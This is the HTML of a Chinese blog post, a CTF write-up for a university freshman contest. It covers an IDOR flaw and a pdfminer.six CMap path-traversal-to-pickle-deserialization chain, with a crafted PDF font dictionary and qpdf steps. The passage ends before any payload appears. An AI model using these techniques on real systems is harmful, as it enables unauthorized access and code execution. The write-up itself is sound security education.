@@ -1,0 +1,522 @@
+
+<!DOCTYPE html>
+<html lang="zh" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <script>
+        (function () {
+            try {
+                var t = localStorage.getItem('february-theme');
+                if (t !== 'dark' && t !== 'light') {
+                    t = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+                }
+                document.documentElement.setAttribute('data-theme', t);
+                document.documentElement.style.colorScheme = t;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+            }
+        })();
+    </script>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>2026-10-28-华中师范新生赛复现WP - 二月の档案室</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="二月, 博客, 技术, 分享, 记录, 学习, 分享, 记录, 档案室, 技术分享,  february, blog, technology, share, record, learn, share, record, archive, technology share,"> 
+    <meta name="description" content="我不相信命运，且我将在醉生梦死中追寻真正的自我。,华中师范新生赛复现WP一、我们可以重新开始吗 —— 越权访问（IDOR）题目描述：黑夜，向左，向右，向前看，到底怎么才能重新走进你的心。
+打开控制台，个人资料页长这样，注意「生产密钥」那一栏只给了打,"> 
+    <meta name="author" content="Allureluoli"> 
+    <link rel="alternative" href="atom.xml" title="二月の档案室" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+    
+    <meta name="twitter:card" content="summary"/>
+    <meta name="twitter:title" content="2026-10-28-华中师范新生赛复现WP - 二月の档案室"/>
+    <meta name="twitter:description" content="我不相信命运，且我将在醉生梦死中追寻真正的自我。,华中师范新生赛复现WP一、我们可以重新开始吗 —— 越权访问（IDOR）题目描述：黑夜，向左，向右，向前看，到底怎么才能重新走进你的心。
+打开控制台，个人资料页长这样，注意「生产密钥」那一栏只给了打,"/>
+    
+    
+    
+    
+    <meta property="og:site_name" content="二月の档案室"/>
+    <meta property="og:type" content="object"/>
+    <meta property="og:title" content="2026-10-28-华中师范新生赛复现WP - 二月の档案室"/>
+    <meta property="og:description" content="我不相信命运，且我将在醉生梦死中追寻真正的自我。,华中师范新生赛复现WP一、我们可以重新开始吗 —— 越权访问（IDOR）题目描述：黑夜，向左，向右，向前看，到底怎么才能重新走进你的心。
+打开控制台，个人资料页长这样，注意「生产密钥」那一栏只给了打,"/>
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+<link rel="stylesheet" href="/css/february.css">
+
+    <meta name="theme-color" content="#faf9f5" />
+    <script>window.searchDbPath = "/search.xml";</script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro&display=swap" rel="stylesheet">
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">二月の档案室</span>
+    <div id="loader"></div>
+    <div class="f-progress" id="f-progress" aria-hidden="true"></div>
+
+    
+<header class="f-dock" id="f-dock">
+    <a class="f-brand" href="/" aria-label="回到首页">
+        <img class="f-brand-avatar" src="/img/avatar.jpg" alt="Allureluoli" width="28" height="28">
+        <span class="f-brand-text">二月<em>FEBRUARY</em></span>
+    </a>
+
+    <nav class="f-dock-links" aria-label="主导航">
+        
+        <a href="/">首页</a>
+        
+        <a href="/categories/">分类</a>
+        
+        <a href="/tags/">标签</a>
+        
+        <a href="/archives/">归档</a>
+        
+        <a href="/about/">关于</a>
+        
+    </nav>
+
+    <div class="f-dock-actions">
+        
+
+        
+        <button class="f-dock-btn icon-play f-play-btn" id="f-play" type="button" title="播放 / 暂停" aria-label="播放或暂停音乐">
+            <svg class="f-play-ico--play" viewBox="0 0 24 24" aria-hidden="true"><path d="M8 5.5v13l11-6.5z" fill="currentColor"/></svg>
+            <svg class="f-play-ico--pause" viewBox="0 0 24 24" aria-hidden="true"><rect x="7" y="5.5" width="3.4" height="13" rx="1.2" fill="currentColor"/><rect x="13.6" y="5.5" width="3.4" height="13" rx="1.2" fill="currentColor"/></svg>
+        </button>
+        
+
+        <button class="f-dock-btn f-theme-btn" id="f-theme" type="button" title="切换深浅色" aria-label="切换深浅色">
+            <svg class="f-ico-moon" viewBox="0 0 24 24" aria-hidden="true"><path d="M21 13.2A8.5 8.5 0 1 1 10.8 3a7 7 0 1 0 10.2 10.2z" fill="currentColor"/></svg>
+            <svg class="f-ico-sun" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="4.2" fill="currentColor"/><path d="M12 2.5v2.2M12 19.3v2.2M2.5 12h2.2M19.3 12h2.2M5.2 5.2l1.6 1.6M17.2 17.2l1.6 1.6M18.8 5.2l-1.6 1.6M6.8 17.2l-1.6 1.6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+        </button>
+
+        <button class="f-dock-btn f-dock-menu switchmenu" type="button" title="菜单" aria-label="打开菜单" aria-expanded="false">
+            <span aria-hidden="true"></span><span aria-hidden="true"></span>
+        </button>
+    </div>
+</header>
+
+    
+<div class="nav" id="f-menu" aria-hidden="true">
+    <div class="f-menu-inner">
+        <p class="f-menu-kicker"><span class="f-pulse"></span>NAVIGATION</p>
+
+        <ul id="menu-menu" class="menu">
+            
+            <li class="pview menu-item" style="--i:0">
+                <a href="/" title="首页">
+                    <span class="f-menu-num">01</span>
+                    <span class="f-menu-text">首页</span>
+                </a>
+            </li>
+            
+            <li class="pview menu-item" style="--i:1">
+                <a href="/categories/" title="分类">
+                    <span class="f-menu-num">02</span>
+                    <span class="f-menu-text">分类</span>
+                </a>
+            </li>
+            
+            <li class="pview menu-item" style="--i:2">
+                <a href="/tags/" title="标签">
+                    <span class="f-menu-num">03</span>
+                    <span class="f-menu-text">标签</span>
+                </a>
+            </li>
+            
+            <li class="pview menu-item" style="--i:3">
+                <a href="/archives/" title="归档">
+                    <span class="f-menu-num">04</span>
+                    <span class="f-menu-text">归档</span>
+                </a>
+            </li>
+            
+            <li class="pview menu-item" style="--i:4">
+                <a href="/about/" title="关于">
+                    <span class="f-menu-num">05</span>
+                    <span class="f-menu-text">关于</span>
+                </a>
+            </li>
+            
+        </ul>
+
+        <div class="hitokoto">
+            <span class="typed" id="hitokoto" data-st="true">「我不相信命运，且我将在醉生梦死中追寻真正的自我。」</span>
+        </div>
+
+        <p class="footerlinks">
+            
+            <a target="_blank" rel="noopener" href="https://x.com/DevilC1875" title="X" aria-label="X">X</a>
+            
+            <a target="_blank" rel="noopener" href="https://github.com/allureluoli/" title="GitHub" aria-label="GitHub">GitHub</a>
+            
+            <a href="weixin://dl/chat?moonfebruarymoon" title="微信" aria-label="微信">微信</a>
+            
+            <a href="mailto:3345483363@qq.com" title="Email" aria-label="Email">Email</a>
+            
+        </p>
+
+        <p id="copyright">
+            &copy; 2026 Allureluoli
+            <span>·</span> Powered by Hexo
+            <span>·</span> Theme Diaspora
+        </p>
+    </div>
+</div>
+
+
+    
+<div id="single" class="f-post">
+    
+<header class="f-post-hero" style="--f-cover:url('/img/cover.jpg')">
+    <div class="f-post-hero-bg"></div>
+    <div class="f-post-hero-veil"></div>
+    <div class="f-post-hero-inner">
+        <nav class="f-crumbs" aria-label="面包屑">
+            <a href="/">首页</a>
+            <span aria-hidden="true">/</span>
+            
+            <span class="f-crumb-cur">正文</span>
+        </nav>
+
+        <h1 class="f-post-title">2026-10-28-华中师范新生赛复现WP</h1>
+
+        <div class="f-post-meta">
+            <span class="f-meta-item">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><rect x="3" y="5" width="18" height="16" rx="3" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M3 10h18M8 3v4M16 3v4" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+                <time datetime="2026-10-27T17:01:26.000Z">2026-10-28</time>
+            </span>
+            <span class="f-meta-item">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="8.5" fill="none" stroke="currentColor" stroke-width="1.8"/><path d="M12 7v5.2l3.2 2" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+                18 min read
+            </span>
+            <span class="f-meta-item">
+                <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 5h16M4 12h10M4 19h13" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+                7.9k 字
+            </span>
+            
+        </div>
+
+        
+        <div class="f-post-tags">
+            
+            <a class="f-tag" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">#网络安全</a>
+            
+            <a class="f-tag" href="/tags/WEB/">#WEB</a>
+            
+        </div>
+        
+    </div>
+</header>
+
+
+    <div class="f-post-wrap">
+        <article class="f-post-main">
+            <div class="content markdown f-content">
+                <h3 id="华中师范新生赛复现WP"><a href="#华中师范新生赛复现WP" class="headerlink" title="华中师范新生赛复现WP"></a>华中师范新生赛复现WP</h3><h2 id="一、我们可以重新开始吗-——-越权访问（IDOR）"><a href="#一、我们可以重新开始吗-——-越权访问（IDOR）" class="headerlink" title="一、我们可以重新开始吗 —— 越权访问（IDOR）"></a>一、我们可以重新开始吗 —— 越权访问（IDOR）</h2><p>题目描述：黑夜，向左，向右，向前看，到底怎么才能重新走进你的心。</p>
+<p>打开控制台，个人资料页长这样，注意「生产密钥」那一栏只给了打码的前缀：</p>
+<p><img src="/img/images/huashi2026-01-profile.png" alt="Lumen 控制台个人资料页，生产密钥被打码"></p>
+<p>页面地址里有一个很显眼的参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://hbc2.haobachang.com:22966/account?id=10482</span><br></pre></td></tr></table></figure>
+
+<p>先看「组织成员」，工号全在表里，而且是自增的：</p>
+<p><img src="/img/images/huashi2026-02-team.png" alt="组织成员目录，工号 10482 / 10486 / 10491 / 10507"></p>
+<p>把 <code>id</code> 换成别人的工号试一下，服务端完全没有属主校验，直接返回了对方的资料，连完整密钥都一起下发了：</p>
+<p><img src="/img/images/huashi2026-03-flag.png" alt="把 id 改成 10491 后，密钥位置直接显示 flag"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;63a8a9045eb94f6285f9043017cb8607&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题的本质是<strong>对象级鉴权缺失</strong>：接口把”你想查谁”和”你能不能查”混在了一起。<code>id</code> 又是自增数字，等于把整张用户表开放成一个可遍历的字典。</p>
+<h2 id="二、全心倾覆，分崩离析-——-pdfminer-CMap-路径穿越-pickle-反序列化"><a href="#二、全心倾覆，分崩离析-——-pdfminer-CMap-路径穿越-pickle-反序列化" class="headerlink" title="二、全心倾覆，分崩离析 —— pdfminer CMap 路径穿越 + pickle 反序列化"></a>二、全心倾覆，分崩离析 —— pdfminer CMap 路径穿越 + pickle 反序列化</h2><p>题目描述：解析者是一种智械。是的，当你回到摩天大楼，又或是想进入绀碧大厦时，它会根据你的大脑神经信号分析你的意图以及做基础的安全检查。解析者能读懂你，不，我好像能跟它对话…</p>
+<p>题目里给了一份「工作站手册」，把关键信息都写明了：文书引擎是 <code>pdfminer.six 20250506</code>，遇到 Type0 复合字体会按 <code>/Encoding</code> 给出的 <strong>CMap 名称</strong>去本地缓存目录找映射表，缓存文件”由引擎按名称补全后加载”。</p>
+<p><img src="/img/images/huashi2026-04-handbook.png" alt="工作站手册：Type0 复合字体会读取 /Encoding 的 CMap 名称并在本地缓存目录查找"></p>
+<p>对应到源码就是 <code>pdfminer/cmapdb.py</code> 里的 <code>_load_data()</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&quot;%s.pickle.gz&quot;</span> % name.replace(<span class="string">&quot;\0&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">cmap_paths = (</span><br><span class="line">    os.environ.get(<span class="string">&quot;CMAP_PATH&quot;</span>, <span class="string">&quot;/usr/share/pdfminer/&quot;</span>),</span><br><span class="line">    os.path.join(os.path.dirname(__file__), <span class="string">&quot;cmap&quot;</span>),   <span class="comment"># /usr/local/lib/python3.12/site-packages/pdfminer/cmap</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">for</span> directory <span class="keyword">in</span> cmap_paths:</span><br><span class="line">    path = os.path.join(directory, filename)           <span class="comment"># ← name 来自 PDF，可穿越</span></span><br><span class="line">    <span class="keyword">if</span> os.path.exists(path):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(<span class="built_in">str</span>(name), (), pickle.loads(gzip.<span class="built_in">open</span>(path).read()))   <span class="comment"># ← 直接反序列化</span></span><br></pre></td></tr></table></figure>
+
+<p>三个条件凑齐就是 RCE：</p>
+<ol>
+<li><code>name</code> 来自 PDF 的 <code>/Encoding</code>，没有 <code>basename</code> &#x2F; <code>realpath</code> 校验 → <strong>路径穿越</strong>；</li>
+<li>后缀被硬拼 <code>.pickle.gz</code> → 我们只能指向”以 <code>.pickle.gz</code> 结尾的文件”；</li>
+<li>命中后 <code>pickle.loads</code> → <strong>反序列化即代码执行</strong>。</li>
+</ol>
+<p>题目又正好给了「科室云盘」，允许上传 <code>.gz</code> 并保留原文件名 —— 这就是给我们投递 payload 用的。</p>
+<h3 id="完整步骤"><a href="#完整步骤" class="headerlink" title="完整步骤"></a>完整步骤</h3><h4 id="1-PDF-的基本对象结构"><a href="#1-PDF-的基本对象结构" class="headerlink" title="1. PDF 的基本对象结构"></a>1. PDF 的基本对象结构</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1 0 obj  Catalog      -&gt; 根</span><br><span class="line">2 0 obj  Pages        -&gt; 页树</span><br><span class="line">3 0 obj  Page         -&gt; /Resources 里挂字体 /Contents 里挂绘制指令</span><br><span class="line">4 0 obj  stream       -&gt; BT /F1 12 Tf ... (Tj) ET   页面的&quot;程序&quot;</span><br><span class="line">5 0 obj  Font         -&gt; 字体字典（关键）</span><br><span class="line">6 0 obj  CIDFont      -&gt; 字体的&quot;下级&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-本地先生成一个极小的-PDF"><a href="#2-本地先生成一个极小的-PDF" class="headerlink" title="2. 本地先生成一个极小的 PDF"></a>2. 本地先生成一个极小的 PDF</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install reportlab</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> reportlab.pdfgen <span class="keyword">import</span> canvas</span><br><span class="line"></span><br><span class="line">pdf = canvas.Canvas(<span class="string">&quot;example.pdf&quot;</span>)</span><br><span class="line"></span><br><span class="line">pdf.setFont(<span class="string">&quot;Helvetica&quot;</span>, <span class="number">20</span>)</span><br><span class="line">pdf.drawString(<span class="number">50</span>, <span class="number">780</span>, <span class="string">&quot;Hello, PDF!&quot;</span>)</span><br><span class="line"></span><br><span class="line">pdf.save()</span><br></pre></td></tr></table></figure>
+
+<p>5 行代码搞定，得到一个只有 <code>/F1</code> 一个简单字体的 PDF。</p>
+<h4 id="3-用-qpdf-解包成可编辑的-QDF"><a href="#3-用-qpdf-解包成可编辑的-QDF" class="headerlink" title="3. 用 qpdf 解包成可编辑的 QDF"></a>3. 用 qpdf 解包成可编辑的 QDF</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qpdf <span class="literal">--qdf</span> <span class="literal">--object-streams</span>=disable <span class="literal">--stream-data</span>=uncompress example.pdf work.qdf</span><br></pre></td></tr></table></figure>
+
+<p>解包后得到（节选）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">%PDF-1.3</span><br><span class="line">%����</span><br><span class="line">%QDF-1.0</span><br><span class="line"></span><br><span class="line">%% Original object ID: 4 0</span><br><span class="line">1 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /PageMode /UseNone</span><br><span class="line">  /Pages 3 0 R</span><br><span class="line">  /Type /Catalog</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">%% Original object ID: 5 0</span><br><span class="line">2 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Author (anonymous)</span><br><span class="line">  /Creator (ReportLab PDF Library - www.reportlab.com)</span><br><span class="line">  /Producer (ReportLab PDF Library - www.reportlab.com)</span><br><span class="line">  /Title (untitled)</span><br><span class="line">  /Trapped /False</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">%% Original object ID: 6 0</span><br><span class="line">3 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Count 1</span><br><span class="line">  /Kids [</span><br><span class="line">    4 0 R</span><br><span class="line">  ]</span><br><span class="line">  /Type /Pages</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">%% Page 1</span><br><span class="line">%% Original object ID: 3 0</span><br><span class="line">4 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Contents 5 0 R</span><br><span class="line">  /MediaBox [</span><br><span class="line">    0</span><br><span class="line">    0</span><br><span class="line">    595.2756</span><br><span class="line">    841.8898</span><br><span class="line">  ]</span><br><span class="line">  /Parent 3 0 R</span><br><span class="line">  /Resources &lt;&lt;</span><br><span class="line">    /Font 7 0 R</span><br><span class="line">    /ProcSet [</span><br><span class="line">      /PDF</span><br><span class="line">      /Text</span><br><span class="line">      /ImageB</span><br><span class="line">      /ImageC</span><br><span class="line">      /ImageI</span><br><span class="line">    ]</span><br><span class="line">  &gt;&gt;</span><br><span class="line">  /Rotate 0</span><br><span class="line">  /Trans &lt;&lt;</span><br><span class="line">  &gt;&gt;</span><br><span class="line">  /Type /Page</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">%% Contents for page 1</span><br><span class="line">%% Original object ID: 7 0</span><br><span class="line">5 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Length 6 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">1 0 0 1 0 0 cm  BT /F1 12 Tf 14.4 TL ET</span><br><span class="line">BT /F1 20 Tf 24 TL ET</span><br><span class="line">BT 1 0 0 1 50 780 Tm (Hello, PDF!) Tj T* ET</span><br><span class="line"> </span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">6 0 obj</span><br><span class="line">108</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">%% Original object ID: 1 0</span><br><span class="line">7 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /F1 8 0 R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">%% Original object ID: 2 0</span><br><span class="line">8 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /BaseFont /Helvetica</span><br><span class="line">  /Encoding /WinAnsiEncoding</span><br><span class="line">  /Name /F1</span><br><span class="line">  /Subtype /Type1</span><br><span class="line">  /Type /Font</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">xref</span><br><span class="line">0 9</span><br><span class="line">0000000000 65535 f </span><br><span class="line">0000000052 00000 n </span><br><span class="line">0000000154 00000 n </span><br><span class="line">0000000493 00000 n </span><br><span class="line">0000000602 00000 n </span><br><span class="line">0000000930 00000 n </span><br><span class="line">0000001093 00000 n </span><br><span class="line">0000001140 00000 n </span><br><span class="line">0000001201 00000 n </span><br><span class="line">trailer &lt;&lt;</span><br><span class="line">  /Info 2 0 R</span><br><span class="line">  /Root 1 0 R</span><br><span class="line">  /Size 9</span><br><span class="line">  /ID [&lt;b9e90f65d5e538a147c2c15381cce1a7&gt;&lt;9a08c6dfecc535bd617192e7955ae38e&gt;]</span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">1319</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-改字体字典"><a href="#4-改字体字典" class="headerlink" title="4. 改字体字典"></a>4. 改字体字典</h4><p>要改的是 <code>8 0 obj</code>（内容流里 <code>/F1</code> 被 <code>Tf</code> 引用过，改它才有效）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%% Original object ID: 2 0</span><br><span class="line">8 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /BaseFont /Helvetica</span><br><span class="line">  /Encoding /WinAnsiEncoding</span><br><span class="line">  /Name /F1</span><br><span class="line">  /Subtype /Type1</span><br><span class="line">  /Type /Font</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure>
+
+<p>改之前先记下手册里给的两个路径，真正命中的是第二个：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">系统目录：  /usr/share/pdfminer/</span><br><span class="line">组件目录：  /usr/local/lib/python3.12/site-packages/pdfminer/cmap</span><br></pre></td></tr></table></figure>
+
+<p>替换成：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">8 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Type /Font</span><br><span class="line">  /BaseFont /FakeType0</span><br><span class="line">  /Subtype /Type0</span><br><span class="line">  /Name /F1</span><br><span class="line">  /Encoding /..#2f..#2f..#2f..#2f..#2f..#2f..#2fdata#2fvault#2f&lt;VID&gt;#2fr</span><br><span class="line">  /DescendantFonts [ 11 0 R ]</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure>
+
+<p>四个改动点：</p>
+<ul>
+<li><code>/Subtype</code> 改成 <code>Type0</code>，<code>/BaseFont</code> 改成不存在的 <code>FakeType0</code>（我们不需要真字形）；</li>
+<li><code>/Encoding</code> 改成穿越路径，指向投递到云盘的那份 pickle（<code>&lt;VID&gt;</code> 是上传后拿到的编号）；</li>
+<li>补上 <code>/DescendantFonts</code>，Type0 必须有下级 CIDFont；</li>
+<li><strong>原来的 <code>/WinAnsiEncoding</code> 那行必须删掉</strong>，留着会把字典结构顶坏。</li>
+</ul>
+<blockquote>
+<p>注意：PDF 的 Name 里 <code>/</code> 是分隔符，必须写成十六进制转义 <code>#2f</code>。
+所以 <code>../../..</code> 要写成 <code>..#2f..#2f..</code>，路径里的 <code>/</code> 也全部换成 <code>#2f</code>。
+少写一个 <code>2f</code>（比如写成 <code>#2fvault#878c1490</code>）就会被解析成 <code>#87</code> + <code>8c1490</code>，路径里多出一个 <code>0x87</code> 字节，彻底跑偏。</p>
+</blockquote>
+<h4 id="5-必须补一个-11-0-obj"><a href="#5-必须补一个-11-0-obj" class="headerlink" title="5. 必须补一个 11 0 obj"></a>5. 必须补一个 11 0 obj</h4><p><code>/DescendantFonts [ 11 0 R ]</code> 是<strong>间接引用</strong>，指向的对象必须真实存在。在 <code>xref</code> 之前追加：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">11 0 obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">  /Type /Font</span><br><span class="line">  /Subtype /CIDFontType2</span><br><span class="line">  /BaseFont /FakeCID</span><br><span class="line">  /CIDSystemInfo &lt;&lt;</span><br><span class="line">    /Registry (Adobe)</span><br><span class="line">    /Ordering (Identity)</span><br><span class="line">    /Supplement 0</span><br><span class="line">  &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br></pre></td></tr></table></figure>
+
+<p>漏掉这一步的话，解析时 <code>/DescendantFonts</code> 会变成 <code>[ null ]</code>，pdfminer 拿不到子字体 spec，<code>/Encoding</code> 直接被忽略 —— <strong>既不报错，也不加载文件</strong>，最后静默降级成 Identity，文字被拆成一个个单字符。这种”安静失败”比抛异常难查得多。</p>
+<p>改完重新打包（xref 偏移会自动重算）：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qpdf work.qdf chart.pdf</span><br></pre></td></tr></table></figure>
+
+<p>会看到 <code>can&#39;t find startxref</code> &#x2F; <code>Attempting to reconstruct</code> 之类的警告，正常 —— 正是因为偏移全失效了，qpdf 在自我重建。</p>
+<h4 id="6-为什么是-7-层"><a href="#6-为什么是-7-层" class="headerlink" title="6. 为什么是 7 层 ../"></a>6. 为什么是 7 层 <code>../</code></h4><p><code>os.path.join(directory, name)</code> 会对两个候选目录各试一次，层数等于候选目录的深度：</p>
+<p>| 候选目录 | 组件数 | 结果 |
+| — | — | — |
+| <code>/usr/share/pdfminer/</code> | 3 | 镜像里这个目录<strong>根本不存在</strong>，路径第一段就 <code>ENOENT</code>，<code>..</code> 一个都没生效 |
+| <code>/usr/local/lib/python3.12/site-packages/pdfminer/cmap</code> | <strong>7</strong> | <code>usr/local/lib/python3.12/site-packages/pdfminer/cmap</code>，退 7 级正好到 <code>/</code> |</p>
+<p>所以必须写 <strong>7 个</strong> <code>..#2f</code>，才能从组件目录爬到根，再下到 <code>/data/vault/&lt;VID&gt;/</code>：</p>
